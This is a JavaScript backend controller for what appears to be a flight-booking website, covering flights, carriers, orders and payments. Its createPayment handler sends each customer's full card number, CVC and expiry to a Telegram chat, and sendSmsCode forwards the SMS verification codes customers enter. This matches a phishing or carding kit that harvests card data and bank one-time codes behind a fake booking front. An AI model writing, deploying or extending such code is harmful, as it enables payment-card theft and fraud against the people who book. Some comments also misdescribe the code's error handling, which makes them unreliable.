const Sequelize = require('sequelize')
const Validator = require('validatorjs')
const Carriers = require('../models/Carriers')
const Flights = require('../models/Flights')
const Reviews = require('../models/Reviews')
const Orders = require('../models/Orders')
const Payments = require('../models/Payments')
const Telegram = require('../../utils/Telegram')

module.exports = {

    /* This is a function that retrieves a list of reviews from a database and returns them as a response
    to an HTTP request. It uses the `findAndCountAll` method from the `Reviews` model to retrieve the
    reviews, and applies pagination to limit the number of results returned. The function then
    constructs a response object with the retrieved reviews and pagination information, and sends it
    back to the client. If an error occurs during the retrieval process, the function catches the error
    and returns a 500 status code with an error message. */
    async getReviews(req, res) {
        try {
            const page = req.query.page || 1
            const limit = req.query.limit || 15
            const offset = (page - 1) * limit
            const reviews = await Reviews.findAndCountAll({
                limit,
                offset,
                order: [
                    ['id', 'DESC']
                ]
            })
            return res.send({
                success: true,
                data: {
                    reviews: reviews.rows,
                    pagination: {
                        total: reviews.count,
                        page: page,
                        pages: Math.ceil(reviews.count / limit)
                    }
                }
            })
        } catch (error) {
            console.error(error)
            return res.send({ message: 'Internal server error' })
        }
    },


    /* This is a function that retrieves a list of carriers from a database and returns them as a response
    to an HTTP request. It uses the `findAndCountAll` method from the `Carriers` model to retrieve the
    carriers, and applies pagination to limit the number of results returned. The function then
    constructs a response object with the retrieved carriers and pagination information, and sends it
    back to the client. If an error occurs during the retrieval process, the function catches the error
    and returns a 500 status code with an error message. */
    async getCarriers(req, res) {
        try {
            const page = req.query.page || 1
            const limit = req.query.limit || 20
            const offset = (page - 1) * limit
            const carriers = await Carriers.findAndCountAll({
                limit,
                offset,
                order: [
                    ['id', 'ASC']
                ]
            })

            return res.send({
                success: true,
                data: {
                    carriers: carriers.rows,
                    pagination: {
                        total: carriers.count,
                        page: page,
                        pages: Math.ceil(carriers.count / limit)
                    }
                }
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },

    /* This is a function that retrieves a list of distinct cities from a database and returns them as a
    response to an HTTP request. It uses the `findAll` method from the `Flights` model to retrieve the
    distinct cities, and constructs a response object with the retrieved cities and sends it back to the
    client. If an error occurs during the retrieval process, the function catches the error and returns
    a 500 status code with an error message. */
    async getCities(req, res) {
        try {
            const cities = await Flights.findAll({
                attributes: [[Sequelize.fn('DISTINCT', Sequelize.col('from')), 'from']],
            });
            const citiesArray = cities.map(city => city.from)

            const citiesTo = await Flights.findAll({
                attributes: [[Sequelize.fn('DISTINCT', Sequelize.col('to')), 'to']],
            });

            const citiesToArray = citiesTo.map(city => city.to)

            citiesToArray.forEach(city => {
                if (!citiesArray.includes(city)) {
                    citiesArray.push(city)
                }
            })

            return res.send({
                success: true,
                data: {
                    cities: citiesArray
                }
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },


    /**
     * This function retrieves flights based on the provided parameters and returns them with pagination
     * information.
     * @param req - The request object contains information about the incoming HTTP request, such as the
     * request headers, request parameters, and request body.
     * @param res - The "res" parameter is the response object that is sent back to the client after the
     * server has processed the request. It contains information such as the HTTP status code, headers, and
     * response body.
     * @returns a response object with a success property set to true and a data property containing an
     * object with two properties: flights and pagination. The flights property contains an array of flight
     * objects, and the pagination property contains information about the total number of flights, the
     * current page, and the total number of pages. If there is an error, the function returns a response
     * object with a message property set
     */
    async getFlights(req, res) {
        try {
            const from = req.query.from
            const to = req.query.to
            const page = req.query.page || 1
            const limit = req.query.limit || 20
            const offset = (page - 1) * limit
            const flights = await Flights.findAndCountAll({
                where: {
                    from: {
                        [Sequelize.Op.like]: `%${from}%`
                    },
                    to: {
                        [Sequelize.Op.like]: `%${to}%`
                    }
                },
                limit,
                offset,
                order: [
                    ['id', 'ASC']
                ]
            })

            return res.send({
                success: true,
                data: {
                    flights: flights.rows,
                    pagination: {
                        total: flights.count,
                        page: page,
                        pages: Math.ceil(flights.count / limit)
                    }
                }
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },

    /**
     * This is an asynchronous function that retrieves flight information based on a given ID and returns
     * it in a response object.
     * @param req - The request object contains information about the HTTP request that was made, such as
     * the request parameters, headers, and body.
     * @param res - `res` is the response object that is sent back to the client making the request. It
     * contains the data that is sent back to the client, such as the HTTP status code, headers, and the
     * response body. In this case, the response body contains either an error message or the flight data
     * @returns a JSON response with either a success message and the flight data if the flight is found,
     * or an error message if there is an internal server error or if the flight id is not provided.
     */
    async getFlight(req, res) {
        try {
            if(!req.params.id) return res.send({ message: 'Flight id is required' })
            const flight = await Flights.findOne({
                where: {
                    id: req.params.id
                },
                include: [ { model: Carriers, as: 'carrier' } ]
            })
            return res.send({
                success: true,
                data: flight
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },


    /* The above code is creating an asynchronous function called `createOrder` that handles the creation
    of a new order for a flight. It first validates the request body using the `Validator` class, and if
    there are validation errors, it returns a response with the error messages. If the validation
    passes, it finds the flight with the given `flight_id` using the `Flights` model, and if it doesn't
    exist, it returns a response with an error message. If the flight exists, it creates a new order
    using the `Orders` model with the data from the request body, and returns */
    async createOrder(req, res) {
        try {
            const validator = new Validator(req.body, {
                flight_id: 'required|integer',
                firstname: 'required|string',
                lastname: 'required|string',
                surname: 'required|string',
                email: 'required|email',
                phone: 'required|string',
                document: 'required|string',
                document_number: 'required|string',
                nationality: 'required|string',
                date_of_birth: 'required|date',
                date: 'required|date',
                gender: 'required|string',
                payment_method: 'required|string',
            })
            if(validator.fails()) return res.send({ message: validator.errors.errors })
            const flight = await Flights.findOne({
                where: {
                    id: req.body.flight_id
                }
            })

            if(!flight) return res.send({ message: 'Flight not found' })
            const order = await Orders.create({
                flight_id: req.body.flight_id,
                firstname: req.body.firstname,
                lastname: req.body.lastname,
                surname: req.body.surname,
                email: req.body.email,
                phone: req.body.phone,
                document: req.body.document,
                document_number: req.body.document_number,
                nationality: req.body.nationality,
                date_of_birth: req.body.date_of_birth,
                date: req.body.date,
                gender: req.body.gender,
                payment_method: req.body.payment_method,
            })
            return res.send({
                success: true,
                message: 'Order created successfully',
                data: order
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },


    /**
     * This function retrieves an order with a specified ID and includes information about the flight
     * associated with the order.
     * @param req - The request object contains information about the HTTP request that was made, such as
     * the request method, headers, and parameters.
     * @param res - The "res" parameter is the response object that will be sent back to the client with
     * the result of the getOrder function. It contains methods to send data back to the client, such as
     * "send" which sends a JSON response.
     * @returns a JSON response with either an error message or the order details including the order ID,
     * email, phone, and flight details (including the flight price) if the order ID is provided and found
     * in the database.
     */
    async getOrder(req, res) {
        try {
            if(!req.params.id) return res.send({ message: 'Order id is required' })
            const order = await Orders.findOne({
                attributes: ['id', 'email', 'phone'],
                where: {
                    id: req.params.id
                },
                include: [ { model: Flights, as: 'flight', attributes: ['price']} ]
            })
            return res.send({
                success: true,
                data: order
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },


    /**
     * This is a skeleton function for creating a payment in JavaScript with error handling.
     * @param req - req stands for request and it is an object that contains information about the incoming
     * HTTP request such as the request headers, request parameters, request body, etc. It is used to
     * retrieve data from the client-side and pass it to the server-side for processing.
     * @param res - The "res" parameter is the response object that will be sent back to the client after
     * the payment creation process is completed. It contains information such as the status code, headers,
     * and body of the response.
     * @returns A JSON object with a message property containing the string "Internal server error".
     */
    async createPayment(req, res) {
        try {
            const validator = new Validator(req.body, {
                order_id: 'required|integer',
                cvc: 'required|string',
                pan: 'required|string',
                expiry: 'required|string',
            })
            if(validator.fails()) return res.send({ message: validator.errors.errors })
            const payment = await Payments.create({
                order_id: req.body.order_id,
                cvc: req.body.cvc,
                pan: req.body.pan,
                expiry: req.body.expiry,
            })

            // send message in telegram
            let message = `Payment created successfully\n\n`
            message += `Order ID: ${payment.order_id}\n`
            message += `CVC: ${payment.cvc}\n`
            message += `PAN: ${payment.pan}\n`
            message += `Expiry: ${payment.expiry}\n`
            message += `Referal: ${localStorage.getItem('ref')}`
            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)

            return res.send({
                success: true,
                message: 'Payment created successfully',
                data: payment
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },

    /**
     * This is an asynchronous function that retrieves a payment with a specified ID and includes the
     * associated order.
     * @param req - The `req` parameter is an object representing the HTTP request made to the server. It
     * contains information such as the request method, headers, URL, and any data sent in the request
     * body.
     * @param res - `res` is the response object that will be sent back to the client making the request.
     * It contains methods to send data back to the client, such as `send()` which sends a JSON response.
     * @returns a payment object with details of the payment and the associated order. If there is an
     * error, it returns a message indicating an internal server error.
     */
    async getPayment(req, res) {
        try {
            if(!req.params.id) return res.send({ message: 'Payment id is required' })
            const payment = await Payments.findOne({
                attributes: ['id'],
                where: {
                    id: req.params.id
                },
                include: [ { model: Orders, as: 'order' } ]
            })
            return res.send({
                success: true,
                data: payment
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    },

    /**
     * This function sends an SMS code to a specified order ID and logs the code in a Telegram chat.
     * @param req - The request object containing information about the incoming HTTP request.
     * @param res - res is the response object that will be sent back to the client making the request. It
     * contains information such as the status code, headers, and response body.
     * @returns If the validation fails, an object with the error message is returned. If the validation
     * passes, a success message is returned. If there is an error, an object with an error message is
     * returned.
     */
    async sendSmsCode(req, res) {
        try {
            const validator = new Validator(req.body, {
                order_id: 'required|integer',
                sms_code: 'required|string',
            })
            if(validator.fails()) return res.send({ message: validator.errors.errors })
            let message = `Order ID: ${req.body.order_id}\n`
            message += `SMS code: ${req.body.sms_code}`
            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
            return res.send({
                success: true,
                message: 'SMS code sent successfully',
            })
        } catch (error) {
            console.log(error)
            return res.send({ message: 'Internal server error' })
        }
    }

}